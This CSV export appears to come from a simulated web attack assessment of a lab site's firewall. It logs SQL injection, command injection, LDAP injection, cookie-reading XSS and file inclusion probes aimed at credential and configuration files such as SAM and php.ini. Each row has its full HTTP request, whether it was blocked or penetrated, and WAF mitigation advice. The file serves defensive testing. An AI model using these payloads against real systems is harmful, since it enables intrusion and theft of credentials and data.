"Source","Timestamp","Attack Type","URL","Action","Method","Payload","Input Name","Risk","Display URL","Status","Sub Category","Mitigation","Previous Status","Redirected","Full Request","Platform","Database"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:19","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i","tel","high","https://ekslabs.cymulatedev.com","blocked","Oracle SQL Injection","Create a WAF Security rule to block incoming requests that contains:AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Oracle SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 374
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:19","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","a);/usr/bin/id;","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03jo=a);/usr/bin/id;","penetrated","Command Injection - Unix","Create a WAF Security rule to block incoming requests that contains:a);/usr/bin/id;.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Unix signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03jo=a);/usr/bin/id; HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","linux","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:19","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\WINDOWS\system32\drivers\etc\hosts","N/A","medium","https://ekslabs.cymulatedev.com\WINDOWS\system32\drivers\etc\hosts","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\WINDOWS\system32\drivers\etc\hosts.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /WINDOWS/system32/drivers/etc/hosts HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:18","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf","N/A","medium","https://ekslabs.cymulatedev.com\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /Program%20Files%20(x86)/Apache%20Group/Apache2/conf/httpd.conf HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:18","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","system('cat config.php');","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03jn=system('cat config.php');","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:system('cat config.php');.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03jn=system(%27cat%20config.php%27); HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:18","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","or sleep(0:0:30)#
' or sleep(0:0:30)#
 or sleep(0:0:30)=","hidden","high","https://ekslabs.cymulatedev.com","blocked","Blind SQL Injection","Create a WAF Security rule to block incoming requests that contains:or sleep(0:0:30)#
' or sleep(0:0:30)#
 or sleep(0:0:30)=.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Blind SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 94
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""or sleep(0:0:30)#\n' or sleep(0:0:30)#\n or sleep(0:0:30)=""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:18","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\Program Files\Apache Group\Apache\logs\error.log","N/A","medium","https://ekslabs.cymulatedev.com\Program Files\Apache Group\Apache\logs\error.log","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\Program Files\Apache Group\Apache\logs\error.log.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /Program%20Files/Apache%20Group/Apache/logs/error.log HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:17","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","""(cn=*)""","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03jm=""(cn=*)""","penetrated","LDAP Injection","Create a WAF Security rule to block incoming requests that contains:""(cn=*)"".
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the LDAP Injection signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03jm=%22(cn=*)%22 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:17","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x63\x6f\x6f\x6b\x69\x65']","password","low","https://ekslabs.cymulatedev.com","penetrated","Generic XSS","Create a WAF Security rule to block incoming requests that contains:this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x63\x6f\x6f\x6b\x69\x65'].
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 374
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""this['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x63\\x6f\\x6f\\x6b\\x69\\x65']"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:16","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\WINDOWS\Repair\SAM","N/A","medium","https://ekslabs.cymulatedev.com\WINDOWS\Repair\SAM","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\WINDOWS\Repair\SAM.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /WINDOWS/Repair/SAM HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:16","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\php\php.ini","N/A","medium","https://ekslabs.cymulatedev.com\php\php.ini","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\php\php.ini.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /php/php.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:16","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\WINNT\win.ini","N/A","medium","https://ekslabs.cymulatedev.com\WINNT\win.ini","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\WINNT\win.ini.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /WINNT/win.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:16","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","2=2","password","high","https://ekslabs.cymulatedev.com","penetrated","Generic SQL Injection","Create a WAF Security rule to block incoming requests that contains:2=2.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 295
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""2=2"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:15","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","onpopstate","password","low","https://ekslabs.cymulatedev.com","penetrated","HTML Events","Create a WAF Security rule to block incoming requests that contains:onpopstate.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the HTML Events signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 302
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""onpopstate"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
